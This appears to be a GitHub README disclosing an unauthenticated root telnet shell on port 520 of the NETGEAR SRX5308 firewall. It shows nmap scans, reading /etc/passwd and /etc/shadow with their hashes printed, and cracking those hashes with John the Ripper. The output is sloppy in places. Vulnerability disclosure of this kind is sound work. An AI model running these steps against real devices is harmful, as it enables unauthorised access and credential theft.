# NETGEAR-ProSafe-Gigabit-Quad-WAN-SSL-VPN-Firewall-SRX5308

<img src="https://raw.githubusercontent.com/0x01369/NETGEAR-ProSafe-Gigabit-Quad-WAN-SSL-VPN-Firewall-SRX5308/main/images.png" class="shrinkToFit" width="700" height="284">

* The NETGEAR ProSAFE SRX5308 Quad WAN Gigabit SSL VPN Firewall is perfect for even the most demanding business networks. The SRX5308 features a hardware-* accelerated data flow architecture that allows for 1 Gbps of stateful firewall throughput.

*Port Scan

* An Unencrypted Telnet 

* 520/tcp  open     telnet
* | fingerprint-strings: 
* |   GetRequest: 
* |     HTTP/1.0
* |     /tmp # GET / HTTP/1.0
* |   SIPOptions: 
* |     OPTIONS sip:nm SIP/2.0
* |     Via: SIP/2.0/TCP nm;branch=foo
* |     From: <sip:nm@nm>;tag=root
* |     <sip:nm2@nm2>
* |     Call-ID: 50000
* |     CSeq: 42 OPTIONS
* |     Max-Forwards: 70
* |     Content-Length: 0
* |     Contact: <sip:nm@nm>
* |     Accept: application/sdp
* |   tn3270: 
* |     ^@IBM-3279-4-E
* |_    ^Y/tmp # IBM-3279-4-E

* telnet 192.168.1.2 520

* cat /etc/passwd

root:x:0:0:root:/root:/bin/sh
nobody:x:0:0:nobody:/nonexistent:/bin/false
showid:1lBVM0/fM8rqk:0:0:sid:/:/pfrm2.0/bin/showid.sh
admin:x:0:2:Linux User,,,:/home/admin:/pfrm2.0/bin/platform.cli
guest:x:0:1000:Linux User,,,:/home/guest:/pfrm2.0/bin/platform.cli

* cat /etc/shadow

daemon:*:13189:0:99999:7:::
root:CxqJynrkPOtP.:12374:0:99999:7:::
admin:m1LVojhaR1U5Y:11582:0:99999:7:::
guest:K7Vjga.vILkVA:11582:0:99999:7:::

* root@kali:~$ unshadow /home/root/Desktop/passwd /home/root/Desktop/shadow > /home/root/Desktop/status

root:CxqJynrkPOtP.:0:0:root:/root:/bin/sh
nobody:x:0:0:nobody:/nonexistent:/bin/false
showid:1lBVM0/fM8rqk:0:0:sid:/:/pfrm2.0/bin/showid.sh
admin:m1LVojhaR1U5Y:0:2:Linux User,,,:/home/admin:/pfrm2.0/bin/platform.cli
guest:K7Vjga.vILkVA:0:1000:Linux User,,,:/home/guest:/pfrm2.0/bin/platform.cli

* root@kali:~$ john /home/root/Desktop/status

* Loaded 2 password hashes with 2 different salts (descrypt, traditional crypt(3) [DES 128/128 SSE2])

* Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist

* password (showid)

* password (guest)

* root@kali:~$ map -sS -sV 192.168.1.2

* Starting Nmap 7.91 ( https://nmap.org )

* PORT STATE SERVICE VERSION

* Starting Nmap 7.92 ( https://nmap.org ) at
* Nmap scan report for localhost
* Host is up (0.079s latency).
* Not shown: 65510 closed tcp ports (reset)
* PORT     STATE    SERVICE       VERSION

53/tcp   open     domain        dnsmasq 2.45
| dns-nsid: 
|_  bind.version: dnsmasq-2.45
80/tcp   open     http          Embedded HTTP Server (Cisco firewall http config)
|_http-title: Did not follow redirect to https://localhost/
|_http-server-header: Embedded HTTP Server.

443/tcp  open     ssl/https?
| ssl-cert: Subject: commonName=Netgear VPN Firewall /organizationName=Netgear Inc./countryName=US
| Not valid before: 2013-01-30T12:00:01
|_Not valid after:  2023-01-28T12:00:01
|_ssl-date: 2001-10-23T03:44:03+00:00; -20y54d07h26m45s from scanner time.

520/tcp  open     telnet
| fingerprint-strings: 
|   GenericLines: 
|     /tmp # 
|     /tmp # 
|     /tmp #
|   GetRequest: 
|     HTTP/1.0
|     /tmp # GET / HTTP/1.0
|     /bin/sh: GET: not found
|     /tmp # 
|     /tmp #
|   Help: 
|     /tmp # HELP
|     /bin/sh: HELP: not found
|     /tmp #
|   NCP, NULL: 
|     /tmp #
|   RPCCheck: 
|     ^@^@(r
|   SIPOptions: 
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|     Accept: application/sdp
|     /tmp # OPTIONS sip:nm SIP/2.0
|     /bin/sh: OPTIONS: not found
|     /tmp # Via: SIP/2.0/TCP nm;branch=foo
|     /bin/sh: Via:: not found
|     /tmp # From: <sip:nm@nm>;tag=root
|     /bin/sh: syntax error: unexpected ";"
|     /tmp # To: <sip:nm2@nm2>
|     /bin/sh: syntax error: unexpected newline
|     /tmp # Call-ID: 50000
|     /bin/sh: Call-ID:: not found
|     /tmp # CSeq: 42 OPTIONS
|     /bin/sh: CSeq:: not found
|     /tmp # Max-Forwards: 70
|     /bin/sh: Max-Forwards:: not found
|     /tmp # Content-Length: 0
|     /bin/sh: Content-Length:: not found
|     /tmp # Contact: <sip:nm@nm>
|     /bin/sh: syntax error: unexpected newline
|     /tmp # Accept: application/sdp
|     /bin/sh: Accept:: not found
|     /tmp # 
|     /tmp #
|   tn3270: 
|     ^@IBM-3279-4-E
|_    ^Y/tmp # IBM-3279-4-E

7911/tcp open     omapi         ISC (BIND|DHCPD) OMAPI
9725/tcp open     unknown

Host script results:
|_clock-skew: -7359d08h26m45s










